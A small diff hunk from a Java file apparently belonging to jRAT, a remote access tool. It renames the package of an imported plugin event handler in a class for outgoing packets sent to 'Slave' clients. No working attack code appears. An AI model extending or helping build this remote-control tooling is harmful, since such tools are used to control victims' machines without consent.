@@ -3,7 +3,7 @@ package pro.jrat.packets.outgoing;
 import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
-import pro.jrat.plugins.PluginEventHandler;
+import pro.jrat.extensions.PluginEventHandler;
 
 
 public abstract class AbstractOutgoingPacket {
